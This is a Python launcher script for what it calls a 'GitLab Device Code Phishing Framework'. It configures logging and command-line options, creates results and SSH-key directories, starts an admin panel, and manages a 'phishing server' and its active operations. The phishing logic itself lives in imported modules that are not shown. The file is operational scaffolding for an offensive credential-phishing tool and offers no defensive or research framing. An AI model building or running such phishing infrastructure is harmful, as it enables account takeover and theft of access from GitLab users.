#!/usr/bin/env python3
"""
GitLab Device Code Phishing Framework - Main Entry Point

This is the main entry point for the GitLab Phishing Framework.
It initializes logging, loads configuration, and starts the admin panel.
"""

import sys
import signal
import logging
from logging.handlers import RotatingFileHandler
from pathlib import Path
import argparse

# Add src directory to path
sys.path.insert(0, str(Path(__file__).parent))

from config.settings import get_config, ConfigurationError
from src.core.engine import CoreEngine


def setup_logging(config) -> None:
    """
    Set up logging with both file and console handlers.
    
    Creates a rotating file handler in the logs/ directory and a console
    handler for stdout. Configures log format with timestamps, level, and
    module name.
    
    Args:
        config: Configuration object with log_level and log_dir
    """
    # Create logs directory if it doesn't exist
    log_dir = Path(config.log_dir)
    log_dir.mkdir(parents=True, exist_ok=True)
    
    # Define log format with timestamp, level, module name, and message
    log_format = '%(asctime)s - %(levelname)s - %(name)s - %(message)s'
    date_format = '%Y-%m-%d %H:%M:%S'
    
    # Create formatter
    formatter = logging.Formatter(log_format, datefmt=date_format)
    
    # Get root logger
    root_logger = logging.getLogger()
    root_logger.setLevel(getattr(logging, config.log_level.upper()))
    
    # Remove any existing handlers
    root_logger.handlers.clear()
    
    # Create rotating file handler (10MB per file, keep 5 backup files)
    log_file = log_dir / 'gitlab_phishing.log'
    file_handler = RotatingFileHandler(
        log_file,
        maxBytes=10 * 1024 * 1024,  # 10MB
        backupCount=5,
        encoding='utf-8'
    )
    file_handler.setLevel(getattr(logging, config.log_level.upper()))
    file_handler.setFormatter(formatter)
    root_logger.addHandler(file_handler)
    
    # Create console handler for stdout
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(getattr(logging, config.log_level.upper()))
    console_handler.setFormatter(formatter)
    root_logger.addHandler(console_handler)
    
    # Log initial message
    root_logger.info("=" * 80)
    root_logger.info("GitLab Device Code Phishing Framework")
    root_logger.info("=" * 80)
    root_logger.info(f"Logging initialized - Level: {config.log_level.upper()}")
    root_logger.info(f"Log file: {log_file.absolute()}")


def signal_handler(signum, frame, engine: CoreEngine):
    """
    Handle shutdown signals gracefully.
    
    Args:
        signum: Signal number
        frame: Current stack frame
        engine: CoreEngine instance to shut down
    """
    logger = logging.getLogger(__name__)
    logger.info(f"Received signal {signum}, initiating graceful shutdown...")
    
    try:
        # Stop all running operations
        logger.info("Stopping all active operations...")
        active_ops = list(engine.active_operations.keys())
        for op_id in active_ops:
            result = engine.stop_operation(op_id)
            if result.success:
                logger.info(f"Operation {op_id} stopped successfully")
            else:
                logger.error(f"Failed to stop operation {op_id}: {result.error}")
        
        # Stop phishing server
        if engine.phishing_server.is_running:
            logger.info("Stopping phishing server...")
            engine.phishing_server.stop()
        
        # Stop admin panel server
        if engine.web_server.is_running:
            logger.info("Stopping admin panel server...")
            engine.web_server.stop_server()
        
        # Close database connections
        logger.info("Closing database connections...")
        engine.db.close()
        
        logger.info("Shutdown complete")
        logger.info("=" * 80)
        
    except Exception as e:
        logger.error(f"Error during shutdown: {e}", exc_info=True)
    
    sys.exit(0)


def parse_arguments():
    """
    Parse command line arguments.
    
    Returns:
        Parsed arguments
    """
    parser = argparse.ArgumentParser(
        description='GitLab Device Code Phishing Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Start with default configuration
  python main.py
  
  # Start with custom configuration file
  python main.py --config /path/to/config.json
  
  # Override log level
  python main.py --log-level DEBUG
  
  # Override ports
  python main.py --admin-port 3001 --phishing-port 8081
        """
    )
    
    parser.add_argument(
        '--config',
        type=str,
        help='Path to configuration file (default: config/default.json)'
    )
    
    parser.add_argument(
        '--log-level',
        type=str,
        choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'],
        help='Override log level from configuration'
    )
    
    parser.add_argument(
        '--admin-port',
        type=int,
        help='Override admin panel port from configuration'
    )
    
    parser.add_argument(
        '--phishing-port',
        type=int,
        help='Override phishing server port from configuration'
    )
    
    return parser.parse_args()


def main():
    """
    Main entry point for the GitLab Phishing Framework.
    
    This function:
    1. Parses command line arguments
    2. Loads configuration
    3. Sets up logging
    4. Initializes the Core Engine
    5. Starts the admin panel
    6. Keeps the process alive until interrupted
    """
    args = parse_arguments()
    
    try:
        # Load configuration
        config_path = Path(args.config) if args.config else None
        config = get_config(config_path)
        
        # Apply command line overrides
        if args.log_level:
            config.log_level = args.log_level
        if args.admin_port:
            config.admin_port = args.admin_port
        if args.phishing_port:
            config.phishing_port = args.phishing_port
        
        # Set up logging
        setup_logging(config)
        logger = logging.getLogger(__name__)
        
        # Log configuration
        logger.info("Configuration loaded successfully")
        logger.info(f"Admin Panel: http://{config.host}:{config.admin_port}/admin")
        logger.info(f"Phishing Server: http://{config.host}:{config.phishing_port}")
        logger.info(f"Database: {config.db_path}")
        logger.info(f"Results Directory: {config.results_dir}")
        
        # Create necessary directories
        Path(config.db_path).parent.mkdir(parents=True, exist_ok=True)
        Path(config.results_dir).mkdir(parents=True, exist_ok=True)
        Path(config.ssh_keys_dir).mkdir(parents=True, exist_ok=True)
        
        # Initialize Core Engine
        logger.info("Initializing Core Engine...")
        engine = CoreEngine(config)
        
        # Set up signal handlers for graceful shutdown
        signal.signal(signal.SIGINT, lambda s, f: signal_handler(s, f, engine))
        signal.signal(signal.SIGTERM, lambda s, f: signal_handler(s, f, engine))
        
        # Start admin panel
        logger.info("Starting admin panel...")
        result = engine.start_admin_only()
        
        if not result.success:
            logger.error(f"Failed to start admin panel: {result.error}")
            sys.exit(1)
        
        logger.info("=" * 80)
        logger.info("GitLab Phishing Framework is running")
        logger.info(f"Admin Panel: http://localhost:{config.admin_port}/admin")
        logger.info("Press Ctrl+C to stop")
        logger.info("=" * 80)
        
        # Keep the process alive
        signal.pause()
        
    except ConfigurationError as e:
        print(f"Configuration Error: {e}", file=sys.stderr)
        sys.exit(1)
    
    except Exception as e:
        print(f"Fatal Error: {e}", file=sys.stderr)
        if 'logger' in locals():
            logger.critical(f"Fatal error: {e}", exc_info=True)
        sys.exit(1)


if __name__ == "__main__":
    main()
